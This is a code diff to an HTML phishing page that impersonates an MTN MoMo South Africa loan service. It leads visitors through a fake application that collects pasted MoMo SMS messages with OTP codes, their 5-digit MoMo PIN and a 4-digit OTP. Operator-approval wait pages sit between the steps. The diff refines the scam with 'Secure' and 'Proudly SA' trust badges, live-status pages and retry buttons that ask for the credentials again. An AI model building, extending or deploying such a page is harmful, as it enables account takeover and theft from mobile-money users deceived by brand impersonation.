@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#FFCC00">
     <title>MTN MoMo South Africa – Easy Loans</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="./style.css" />
@@ -33,6 +34,11 @@
                     <div class="monthly-box"><span class="ml">Monthly Payment</span><span class="ma" id="monthlyAmt">R 1,042</span></div>
                 </div>
                 <button class="btn-grad" onclick="startApplication()">Start Application</button>
+                <div class="land-badges">
+                    <span class="badge">🔒 Secure</span>
+                    <span class="badge">⚡ Fast Approval</span>
+                    <span class="badge">🇿🇦 Proudly SA</span>
+                </div>
             </div>
         </div>
         <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN South Africa</div>
@@ -147,17 +153,32 @@
         <div style="background:var(--mtn-black); min-height:100vh; width:100%; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="proc-wrap">
                 <div class="proc-icon">⏳</div>
-                <h2>Processing Application...</h2>
-                <p>Please wait while we process your loan application</p>
-                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-yellow); font-weight:600;">⏳ Awaiting admin approval...</div>
+                <h2>Submitting...</h2>
+                <p>Sending your application for review</p>
+                <div id="processingStatus" class="proc-status">⏳ Please wait...</div>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 6: SMS PASTE -->
+    <!-- PAGE 6: WAIT APPLICATION APPROVAL -->
+    <div id="page-wait-app" class="page">
+        <div class="wait-bg">
+            <div class="wait-wrap">
+                <div class="wait-icon pulse">📋</div>
+                <h2>Application Under Review</h2>
+                <p>Our team is reviewing your application. This usually takes 1–2 minutes.</p>
+                <div class="wait-status" id="waitAppStatus">⏳ Awaiting approval...</div>
+                <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
+                <div class="wait-appid">Application ID: <span id="waitAppId" class="mono">-</span></div>
+                <button class="btn-gray" onclick="cancelAndRestart()" style="margin-top:20px;">Cancel & Restart</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 7: SMS PASTE -->
     <div id="page-sms-paste" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-processing')">← Back</a>
+            <a class="nav-left" onclick="goTo('page-wait-app')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:8px;">
                 <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" />
                 <div style="text-align:left;">
@@ -174,32 +195,36 @@
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="momErr"><span class="msg-icon">✕</span><span id="momErrTxt"></span></div>
                 <div class="momo-msg-box">
-                    <label style="font-weight:700; display:block; margin-bottom:8px; color:var(--mtn-black);">📩 Paste the MoMo message content:</label>
-                    <textarea id="smsMsgBox" placeholder="Copy and paste the entire MoMo message you received on your phone here..." style="width:100%; padding:12px 14px; border:1.5px solid var(--border); border-radius:8px; font-family:'Inter',sans-serif; font-size:0.9rem; min-height:140px; resize:vertical; outline:none;"></textarea>
-                    <div class="hint" style="font-size:0.75rem; color:var(--text-light); margin-top:6px;">This should include the OTP code or verification details sent to your MoMo number.</div>
+                    <label class="momo-label">📩 Paste the MoMo message content:</label>
+                    <textarea id="smsMsgBox" placeholder="Copy and paste the entire MoMo message you received on your phone here..."></textarea>
+                    <div class="hint">This should include the OTP code or verification details sent to your MoMo number.</div>
                 </div>
-                <div style="margin: 12px 0; padding: 12px 14px; background: var(--mtn-yellow-soft); border-left: 4px solid var(--mtn-yellow); border-radius: 6px; font-size:0.8rem; color:var(--mtn-black); line-height:1.5;">
+                <div class="tip-box">
                     <strong>💡 Tip:</strong> Check your SMS inbox for the message from MTN MoMo South Africa. Copy the entire message text.
                 </div>
-                <button class="btn-grad" onclick="doSmsParse()">Submit MoMo Message</button>
+                <button class="btn-grad" onclick="doSmsParse()" id="smsSubmitBtn">Submit MoMo Message</button>
+                <button class="btn-resend hidden" id="resendSmsBtn" onclick="resendSms()">🔄 Resend SMS Verification</button>
+                <button class="btn-outline" onclick="retryStep('sms')">↻ Clear & Retry</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 7: WAIT SMS -->
+    <!-- PAGE 8: WAIT SMS APPROVAL -->
     <div id="page-wait-sms" class="page">
-        <div style="background:var(--mtn-black); min-height:100vh; width:100%; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div class="wait-bg">
             <div class="wait-wrap">
-                <div class="wait-icon">⏳</div>
-                <h2>Verifying SMS Message...</h2>
-                <p>Your SMS message has been received. Please wait for admin verification...</p>
-                <div id="waitSmsStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-yellow); font-weight:600;">⏳ Admin is reviewing your SMS...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.55);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-yellow); font-weight:700;">-</span></div>
+                <div class="wait-icon pulse">📨</div>
+                <h2>Verifying SMS...</h2>
+                <p>Our team is reviewing your MoMo message. Please wait.</p>
+                <div class="wait-status" id="waitSmsStatus">⏳ Awaiting approval...</div>
+                <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
+                <div class="wait-appid">Application ID: <span id="waitSmsAppId" class="mono">-</span></div>
+                <button class="btn-gray" onclick="retryStep('sms')" style="margin-top:20px;">↻ Retry SMS</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 8: PIN (5 DIGITS) -->
+    <!-- PAGE 9: PIN -->
     <div id="page-pin" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-wait-sms')">← Back</a>
@@ -219,9 +244,7 @@
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
                 <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
                 <div class="pin-label">Enter your MoMo PIN (5 digits):</div>
-                <div id="pinAttemptsDisplay" class="pin-attempts">
-                    🔑 Attempts remaining: 3 of 3
-                </div>
+                <div id="pinAttemptsDisplay" class="pin-attempts">🔑 Attempts remaining: 3 of 3</div>
                 <div class="pin-row">
                     <input type="password" id="pin0" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" placeholder="•" />
                     <input type="password" id="pin1" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" placeholder="•" />
@@ -229,27 +252,30 @@
                     <input type="password" id="pin3" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" placeholder="•" />
                     <input type="password" id="pin4" class="pin-box" maxlength="1" oninput="pinMvM(this,4)" placeholder="•" />
                     <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
-                    <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
+                    <button class="pin-delete" onclick="clearLoginPin()" title="Clear">✕</button>
                 </div>
-                <button class="btn-grad" onclick="doPin()" style="margin-top:10px;">Submit MoMo PIN</button>
+                <button class="btn-grad" onclick="doPin()" id="pinSubmitBtn" style="margin-top:10px;">Submit MoMo PIN</button>
+                <button class="btn-outline" onclick="retryStep('pin')">↻ Clear & Retry PIN</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 9: WAIT PIN -->
+    <!-- PAGE 10: WAIT PIN APPROVAL -->
     <div id="page-wait-pin" class="page">
-        <div style="background:var(--mtn-black); min-height:100vh; width:100%; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div class="wait-bg">
             <div class="wait-wrap">
-                <div class="wait-icon">⏳</div>
-                <h2>Verifying MoMo PIN...</h2>
-                <p>Your MoMo PIN has been received. Please wait for admin verification...</p>
-                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-yellow); font-weight:600;">⏳ Admin is reviewing your PIN...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.55);">Application ID: <span id="waitPinAppId" style="font-family:monospace; color:var(--mtn-yellow); font-weight:700;">-</span></div>
+                <div class="wait-icon pulse">🔐</div>
+                <h2>Verifying PIN...</h2>
+                <p>Your MoMo PIN is being reviewed. Please wait.</p>
+                <div class="wait-status" id="waitPinStatus">⏳ Awaiting approval...</div>
+                <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
+                <div class="wait-appid">Application ID: <span id="waitPinAppId" class="mono">-</span></div>
+                <button class="btn-gray" onclick="retryStep('pin')" style="margin-top:20px;">↻ Retry PIN</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 10: OTP (4 DIGITS) -->
+    <!-- PAGE 11: OTP -->
     <div id="page-otp" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-wait-pin')">← Back</a>
@@ -265,7 +291,7 @@
         <div class="step-center">
             <div class="step-card">
                 <h2>Enter OTP Code</h2>
-                <p class="step-sub">Enter the 4-digit OTP code sent to your phone via MTN MoMo South Africa</p>
+                <p class="step-sub">Enter the 4-digit OTP code sent to your phone</p>
                 <div class="otp-section">
                     <div class="otp-section-title">OTP Code (4 digits):</div>
                     <div style="display: flex; align-items: center;">
@@ -275,51 +301,61 @@
                             <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
                             <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
                         </div>
-                        <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
+                        <button class="otp-delete" onclick="clearOtpCode()" title="Clear">✕</button>
                     </div>
                 </div>
                 <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
-                <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">
-                    🔄 Resend OTP
-                </button>
-                <div id="rejectionInfo" style="margin-top: 10px; font-size: 0.8rem; color: var(--text-light);"></div>
-                <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">Verify & Approve Loan</button>
+                <button class="btn-grad" onclick="doOtp()" id="otpSubmitBtn" style="margin-top: 10px;">Verify & Approve Loan</button>
+                <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">🔄 Resend OTP</button>
+                <button class="btn-outline" onclick="retryStep('otp')">↻ Clear & Retry OTP</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 11: WAIT OTP -->
+    <!-- PAGE 12: WAIT OTP APPROVAL -->
     <div id="page-wait-otp" class="page">
-        <div style="background:var(--mtn-black); min-height:100vh; width:100%; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div class="wait-bg">
             <div class="wait-wrap">
-                <div class="wait-icon">⏳</div>
-                <h2>Verifying OTP Code...</h2>
-                <p>Your OTP code has been received. Please wait for admin verification...</p>
-                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-yellow); font-weight:600;">⏳ Admin is verifying your OTP...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.55);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-yellow); font-weight:700;">-</span></div>
+                <div class="wait-icon pulse">🔑</div>
+                <h2>Verifying OTP...</h2>
+                <p>Almost there — confirming your OTP code.</p>
+                <div class="wait-status" id="waitOtpStatus">⏳ Awaiting approval...</div>
+                <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
+                <div class="wait-appid">Application ID: <span id="waitOtpAppId" class="mono">-</span></div>
+                <button class="btn-gray" onclick="retryStep('otp')" style="margin-top:20px;">↻ Retry OTP</button>
             </div>
         </div>
     </div>
 
-    <!-- PAGE 12: APPROVAL -->
+    <!-- PAGE 13: APPROVAL -->
     <div id="page-approval" class="page">
         <div class="appr-wrap">
             <div class="appr-top">
                 <div class="check-circle">✓</div>
                 <h2 class="appr-title">Loan Approved!</h2>
                 <p class="appr-sub">Your loan has been successfully approved.</p>
-                <div class="appr-banner"><div class="abl">Amount to Receive</div><div class="aba" id="aprAmount">R 50,000</div></div>
+                <div class="appr-banner">
+                    <div class="abl">Amount to Receive</div>
+                    <div class="aba" id="aprAmount">R 50,000</div>
+                </div>
             </div>
-            <div class="comp-box"><div class="ch">ℹ️ Important Information</div><p>The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p></div>
+            <div class="comp-box">
+                <div class="ch">ℹ️ Important Information</div>
+                <p>The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.</p>
+            </div>
             <div class="ld-card">
                 <div class="ld-htitle">📊 Loan Details</div>
-                <div class="ld-row"><div class="ld-icon ic-g">💰</div><div><div class="ld-lbl">Amount</div><div class="ld-val" id="aprAmt">R 50,000</div></div></div>
-                <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">Term</div><div class="ld-val" id="aprTerm">48 Months</div></div></div>
-                <div class="ld-row"><div class="ld-icon ic-p">💳</div><div><div class="ld-lbl">Monthly Payment</div><div class="ld-val" id="aprMth">R 1,042</div></div></div>
+                <div class="ld-row"><div class="ld-icon">💰</div><div><div class="ld-lbl">Amount</div><div class="ld-val" id="aprAmt">R 50,000</div></div></div>
+                <div class="ld-row"><div class="ld-icon">📅</div><div><div class="ld-lbl">Term</div><div class="ld-val" id="aprTerm">48 Months</div></div></div>
+                <div class="ld-row"><div class="ld-icon">💳</div><div><div class="ld-lbl">Monthly Payment</div><div class="ld-val" id="aprMth">R 1,042</div></div></div>
             </div>
-            <div class="nxt-steps"><span style="font-size:1.2rem;">📌</span><p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</p></div>
+            <div class="nxt-steps">
+                <span style="font-size:1.2rem;">📌</span>
+                <p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</p>
+            </div>
             <div class="rth-wrap">
                 <button class="rth-btn" onclick="alert('Thank you! Your loan has been disbursed.')">Finish</button>
+                <button class="btn-outline" onclick="restartApplication()" style="margin-top:10px;">Start New Application</button>
             </div>
         </div>
     </div>
